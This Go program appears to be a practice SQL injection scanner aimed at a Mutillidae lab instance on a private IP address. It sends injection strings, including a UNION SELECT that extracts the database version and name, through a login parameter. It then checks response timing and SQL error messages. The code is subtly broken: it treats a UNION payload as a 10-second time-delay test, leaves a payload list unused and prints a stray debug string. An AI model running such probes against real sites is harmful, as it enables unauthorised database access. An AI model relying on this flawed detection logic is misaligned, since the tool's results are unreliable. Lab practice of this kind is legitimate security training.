package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

var payloads = []string{
	"baseline",
	"(",
	")",
	"/",
	"'",
}

var timePayloads = []struct {
	payload       string
	expectedDelay int
}{
	{"' UNION SELECT null, version(), database() -- ", 10},
}

var sqlErrors = []string{
	"SQL",
	"MySQL",
	"ORA-",
}

var errRegex []*regexp.Regexp

func sendRequest(client *http.Client, baseURL, payload string) (string, time.Duration, error) {
	body := fmt.Sprintf("username=%s&password='asdf'&", url.QueryEscape(payload))
	reqURL := fmt.Sprintf("%s&%suser-info-php-submit-button=View+Account+Details", baseURL, body)
	req, err := http.NewRequest("GET", reqURL, nil)
	if err != nil {
		return "", 0, err
	}

	start := time.Now()
	res, err := client.Do(req)
	if err != nil {
		return "", 0, err
	}
	defer res.Body.Close()

	resBody, err := io.ReadAll(res.Body)
	if err != nil {
		return "", 0, err
	}
	duration := time.Since(start)
	return string(resBody), duration, nil
}

func main() {
	baseURL := "http://172.16.21.129/mutillidae/index.php?page=user-info.php"
	client := &http.Client{}

	for _, errStr := range sqlErrors {
		reg := regexp.MustCompile(fmt.Sprintf(".*%s.*", errStr))
		errRegex = append(errRegex, reg)
	}

	fmt.Println("Measuring baseline response time...")
	baselineBody, baselineDuration, err := sendRequest(client, baseURL, "baseline")
	if err != nil {
		log.Panic("Baseline request error: ", err)
	}
	fmt.Printf("Baseline response time: %v\n", baselineDuration)
	for _, reg := range errRegex {
		if reg.MatchString(baselineBody) {
			fmt.Printf("Baseline SQL error detected: %s\n", reg.String())
		}
	}

	margin := 2 * time.Second
	for _, test := range timePayloads {
		fmt.Printf("\nTesting time-based payload: %s\n", test.payload)
		resBody, duration, err := sendRequest(client, baseURL, test.payload)
		if err != nil {
			log.Panic("Request error: ", err)
		}
		fmt.Printf("Response time: %v\n", duration)

		expectedDelayDuration := time.Duration(test.expectedDelay) * time.Second
		fmt.Println(expectedDelayDuration-margin, "asfd")
		if duration-baselineDuration >= expectedDelayDuration-margin {
			fmt.Printf("Possible time-based SQL injection detected! (expected delay: %v)\n", expectedDelayDuration)
		} else {
			fmt.Println("No significant delay detected.")
		}

		regErr := ""
		for _, reg := range errRegex {
			if reg.MatchString(resBody) {
				regErr = reg.String()
				break
			}
		}
		if len(regErr) != 0 {
			lines := strings.Split(resBody, "\n")
			for _, line := range lines {
				if isMatch, _ := regexp.MatchString(regErr, line); isMatch {
					fmt.Println("SQL error message:", line)
				}
			}
		}
	}
}
